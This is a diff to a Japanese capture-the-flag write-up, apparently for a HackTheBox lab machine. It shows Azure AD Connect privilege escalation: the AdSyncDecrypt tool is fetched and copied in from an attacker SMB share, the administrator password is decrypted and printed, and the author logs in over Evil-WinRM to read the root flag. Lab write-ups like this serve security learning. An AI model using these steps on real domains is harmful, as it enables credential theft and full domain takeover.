@@ -232,7 +232,12 @@ SqlServerInstanceName :
 SqlServerDBName       : ADSync
 ```
 「ADSync exploit」でググると、[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)というツールを発見  
-[ポスト](https://web.archive.org/web/20230330142808/https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)を見ると、この[ツール](https://github.com/dirkjanm/adconnectdump/tree/master/ADSyncDecrypt/ADSyncDecrypt)のプリコンパイル版らしい  
+[ポスト](https://web.archive.org/web/20230330142808/https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)を見ると、この[ツール](https://github.com/dirkjanm/adconnectdump/tree/master/ADSyncDecrypt/ADSyncDecrypt)のVB.NET製らしい  
+仕組みとしては
+1. DBからKeyManagerから暗号化キーを取得
+2. DBから暗号化されたパスワードを取得
+3. 「C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll」の「Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager」を使って暗号化キーによるパスワード復号
+
 ということでダウンロード
 ```sh
 └─$ wget -nv https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
@@ -252,11 +257,14 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 [*] Config file parsed
 ```
-配送し、ポストで紹介されている使い方で実行
+配送し、ポストで紹介されている使い方で実行  
+administratorのパスワードゲット！
 ```powershell
 *Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\mcrypt.dll
 
 *Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\AdDecrypt.exe
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> cd 'C:\Program Files\Microsoft Azure AD Sync\Bin>'
 
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
 
@@ -276,4 +284,18 @@ DECRYPTED CREDENTIALS:
 Username: administrator
 Password: d0m@in4dminyeah!
 Domain: MEGABANK.LOCAL
+```
+winrmでログイン成功！ルートフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
+e31ccf960d1eac8460ce38938cf9c98c
 ```
